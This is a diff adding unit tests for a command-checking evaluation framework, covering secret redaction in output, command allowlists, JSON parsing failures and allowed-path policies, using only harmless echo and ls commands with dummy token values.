+	try { remove_file(".eval_redaction_audit_suite.json") } except err {}
+}
+
+test "check_output_contains redacts organization specific custom patterns" {
+	result := check_output_contains({
+		"command": "echo 'internal_secret_abcd1234'",
+		"expected": "REDACTED",
+		"redaction_audit_mode": true,
+		"redact_output_patterns": ["internal_secret_[a-z0-9]+"]
+	})
+	assert_true(result["ok"])
+	details := dict_get_or(dict_get_or(result, "data", {}), "details", {})
+	stdout_val := dict_get_or(details, "stdout", "")
+	assert_true(contains(stdout_val, "internal_secret_abcd1234") == 0)
+	assert_true(contains(stdout_val, "REDACTED") == 1)
+	assert_true(dict_get_or(details, "redaction_hits", 0) > 0)
+}
+
+test "run_suite threads suite level custom redaction patterns into command checks" {
+	try {
+		write_file(".eval_custom_redaction_suite.json", "{\"name\":\"custom-redaction-suite\",\"redaction_audit_mode\":true,\"redact_output_patterns\":[\"internal_secret_[a-z0-9]+\"],\"tests\":[{\"name\":\"custom-redaction\",\"check\":\"output_contains\",\"params\":{\"command\":\"echo internal_secret_abcd1234\",\"expected\":\"REDACTED\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_custom_redaction_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	test_results := dict_get_or(data, "test_results", [])
+	first := {}
+	if len(test_results) > 0 {
+		first = test_results[0]
+	}
+	details := dict_get_or(first, "details", {})
+	stdout_val := dict_get_or(details, "stdout", "")
+
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_true(contains(stdout_val, "internal_secret_abcd1234") == 0)
+	assert_true(contains(stdout_val, "REDACTED") == 1)
+	assert_true(dict_get_or(details, "redaction_hits", 0) > 0)
+
+	try { remove_file(".eval_custom_redaction_suite.json") } except err {}
+}
+
+test "run_shell redacts bearer token pattern in stdout" {
+	result := run_shell("echo 'Authorization: Bearer longtokenvalue'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "longtokenvalue") == 0)
+	assert_true(contains(result["stdout"], "REDACTED") == 1)
+}
+
+test "output_contains denies command outside allowlist" {
+	result := check_output_contains({"command": "ls -la", "expected": "README", "allowed_commands": ["echo"]})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "Command execution failed") == 1 || contains(msg, "rejected") == 1)
+}
+
+test "command_stdout_json_path_equals fails on malformed stdout JSON" {
+	result := check_command_stdout_json_path_equals({"command": "echo not-json", "json_path": "a.b", "expected": "x"})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "Failed to parse stdout as JSON") == 1)
+}
+
+test "two_files_equal enforces allowed_paths policy" {
+	try {
+		write_file(".eval_sec_two_a.txt", "same")
+		write_file(".eval_sec_two_b.txt", "same")
+	} except err {}
+
+	result := check_two_files_equal({"path_a": ".eval_sec_two_a.txt", "path_b": ".eval_sec_two_b.txt", "allowed_paths": ["./safe/"]})
+	assert_false(result["ok"])
+
+	try {
+		remove_file(".eval_sec_two_a.txt")
+		remove_file(".eval_sec_two_b.txt")
+	} except err {}
+}
+
+test "directory_diff enforces allowed_paths policy" {
+	try {
+		create_dir(".eval_sec_dir_a")
+		create_dir(".eval_sec_dir_b")
+	} except err {}
+
+	result := check_directory_diff({"dir_a": ".eval_sec_dir_a", "dir_b": ".eval_sec_dir_b", "allowed_paths": ["./safe/"]})
+	assert_false(result["ok"])
+
+	try {
+		remove_file(".eval_sec_dir_a")
+		remove_file(".eval_sec_dir_b")
+	} except err {}
+}
